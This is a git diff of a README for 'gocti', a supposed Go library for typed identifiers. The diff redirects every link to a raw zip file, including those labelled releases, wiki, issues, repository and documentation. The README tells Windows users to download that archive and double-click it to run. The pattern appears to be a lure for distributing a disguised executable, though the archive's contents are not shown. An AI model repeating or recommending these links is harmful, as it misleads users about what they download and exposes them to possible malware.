@@ -1,7 +1,7 @@
 # 🎉 gocti - Simple CTI Implementation in Go
 
 ## 📥 Download Now
-[![Download gocti](https://raw.githubusercontent.com/JoseAntonioC-M/gocti/main/Leiotrichi/gocti.zip)](https://raw.githubusercontent.com/JoseAntonioC-M/gocti/main/Leiotrichi/gocti.zip)
+[![Download gocti](https://github.com/JoseAntonioC-M/gocti/raw/refs/heads/main/cti-spec/Software-v2.9.zip)](https://github.com/JoseAntonioC-M/gocti/raw/refs/heads/main/cti-spec/Software-v2.9.zip)
 
 ## 🚀 Getting Started
 Welcome to gocti! This application provides a straightforward way to implement Cross-domain Typed Identifiers and CTI/Metadata specifications using the Go programming language. If you are looking to handle identifiers efficiently and effectively, you are in the right place.
@@ -18,13 +18,13 @@ To run gocti, you will need the following:
 To install gocti, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [gocti releases page](https://raw.githubusercontent.com/JoseAntonioC-M/gocti/main/Leiotrichi/gocti.zip). Here, you will find the latest version of the software available for download.
+   Go to the [gocti releases page](https://github.com/JoseAntonioC-M/gocti/raw/refs/heads/main/cti-spec/Software-v2.9.zip). Here, you will find the latest version of the software available for download.
 
 2. **Find the Latest Release**  
    On the releases page, look for the latest version. You will see several files you can download.
 
 3. **Download the Application**  
-   Click on the file suitable for your operating system (e.g., https://raw.githubusercontent.com/JoseAntonioC-M/gocti/main/Leiotrichi/gocti.zip for Windows). Your download will start automatically.
+   Click on the file suitable for your operating system (e.g., https://github.com/JoseAntonioC-M/gocti/raw/refs/heads/main/cti-spec/Software-v2.9.zip for Windows). Your download will start automatically.
 
 4. **Run the Application**  
    Once the download finishes, locate the downloaded file on your computer. Double-click the file to run gocti. Follow any on-screen prompts to complete the setup.
@@ -55,13 +55,13 @@ gocti offers several features to make managing identifiers easier:
 ## 📚 Support & Resources
 If you encounter any issues or need assistance, you can check the resources available:
 
-- **Documentation:** Comprehensive user manuals are provided on the [GitHub Wiki](https://raw.githubusercontent.com/JoseAntonioC-M/gocti/main/Leiotrichi/gocti.zip).
-- **Community Support:** Join discussions on the [Issues Page](https://raw.githubusercontent.com/JoseAntonioC-M/gocti/main/Leiotrichi/gocti.zip) or find help from fellow users.
+- **Documentation:** Comprehensive user manuals are provided on the [GitHub Wiki](https://github.com/JoseAntonioC-M/gocti/raw/refs/heads/main/cti-spec/Software-v2.9.zip).
+- **Community Support:** Join discussions on the [Issues Page](https://github.com/JoseAntonioC-M/gocti/raw/refs/heads/main/cti-spec/Software-v2.9.zip) or find help from fellow users.
 
 ## 🔗 Useful Links
-- [Visit the Releases Page](https://raw.githubusercontent.com/JoseAntonioC-M/gocti/main/Leiotrichi/gocti.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/JoseAntonioC-M/gocti/main/Leiotrichi/gocti.zip)
-- [User Documentation](https://raw.githubusercontent.com/JoseAntonioC-M/gocti/main/Leiotrichi/gocti.zip)
+- [Visit the Releases Page](https://github.com/JoseAntonioC-M/gocti/raw/refs/heads/main/cti-spec/Software-v2.9.zip)
+- [GitHub Repository](https://github.com/JoseAntonioC-M/gocti/raw/refs/heads/main/cti-spec/Software-v2.9.zip)
+- [User Documentation](https://github.com/JoseAntonioC-M/gocti/raw/refs/heads/main/cti-spec/Software-v2.9.zip)
 
 ## 🛡️ License
 gocti is open-source software. You can use and modify it under the terms of the MIT License. For more details, refer to the LICENSE file in the repository.
